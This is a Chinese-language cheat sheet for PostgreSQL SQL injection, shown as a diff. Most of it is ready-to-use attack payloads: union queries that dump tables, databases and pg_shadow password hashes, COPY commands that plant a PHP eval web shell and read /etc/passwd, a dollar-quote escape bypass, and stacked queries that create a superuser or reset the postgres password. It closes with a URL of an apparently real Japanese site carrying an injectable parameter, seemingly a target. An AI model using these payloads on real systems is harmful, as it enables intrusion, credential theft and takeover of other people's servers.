@@ -1,0 +1,90 @@
+postgreSQL注入总结
+
+Postgre SQL Injection
+
+结合了MSSQL MySQL Oracle的一些特点
+
+支持多语句执行，语句可以没有from,
+
+postgres用户是超级用户(创始人账户) 只有superuser有copy权限
+
+注释: --  ,  /**/
+连接符: %20 , + , /**/
+
+内置函数:
+current_database() //当前数据库名
+session_user   //会话用户
+current_user   //当前数据库用户
+user           //当前用户
+version()      //数据库版本
+
+Union注射:
+order by n--
+and 1=2 union select null,null,null--
+and 1=2 union select 'beach',null,null--
+and 1=2 union select (select version()),null,null--
+
+获取表名,字段名(新版本利用information_schema):
+and 1=2 union select table_name,null,null from information_schema.tables limit 1 offset n--
+and 1=2 union select column_name,null,null from information_schema.columns where table_name='admin' limit 1 offset n--
+(老版本)
+pg_class.oid对应pg_attribute.attrelid
+pg_class.relname表名
+pg_attribute.attname字段名
+
+select relname from pg_class获取表名
+select oid from pg_class wehre relname='admin'获取表的oid
+select attname from pg_attribute where attrelid='oid的值'  获取字段名
+实战:
+and 1=2 union select relname,null,null from pg_class where relkind='r' limit 1 offset 0--加入relkind='r'只查询普通表
+and 1=2 union select cast(oid as varchar(10)),null,null from pg_class where relkind='r' limit 1 offset 0--
+由于oid类型是oid,要数据类型兼容我们用cast函数强制转换成varchar类型。比如得到1136
+
+and 1=2 union select attname,null,null from pg_attribute where attrelid=1136 limit 1 offset 0--爆表名
+============================================================================
+and 1=2 union select datname,null,null from pg_database limit 1 offset 0--爆库
+and 1=2 union select username||chr(124)||passwd,null,null from pg_shadow limit 1 offset 0--爆数据库用户密码
+
+######################################################
+老版本写文件:
+create table beach(shell text)
+insert into beach values('<?php eval($_POST[c])?>')
+copy beach(shell) to '/var/www/html/shell.php'
+drop table beach
+
+#PS:copy (select '<?php eval($_POST[c])?>') to '/var/www/html/shell.php'
+
+老版本读文件:
+create table beach(shell text)
+copy beach(shell) from '/etc/passwd'
+select * from beach limit 1 offset n读每一行
+
+实战:
+登入后:
+sql>select '<%execute request("v")%>';
+sql>\o c:\\wwwroot\\1.asp
+URL执行:
+id=1;copy (select '<?php eval($_POST[c])?>') to '/var/www/html/shell.php'
+
+新版本:
+pg_file_write(filename,text,bool)
+pg_read_file(filename,pos,length)
+pg_ls_dir(dirname)
+
+绕过转义: GPC=On时候 用$quote$代替单引号
+如:select pwd from admin wehre user='beach'
+成:select pwd from admin where user=$x$beach$x$
+
+
+如果发现注入点用的账户是postgres
+
+id=1;create+user+beach+with+superuser+password+'123456'--
+
+即可登录
+id=1;alter+user+postgres+with+password+'hacker'--
+
+这条指令修改了postgres的密码，即系统账户postgres的密码，
+如果有3389就可以直接postgres hacker登陆，但是网站由于密码认证失败，会崩溃。。。。。。
+
+
+http://card.joshin.co.jp/info/detail.php?id=236;
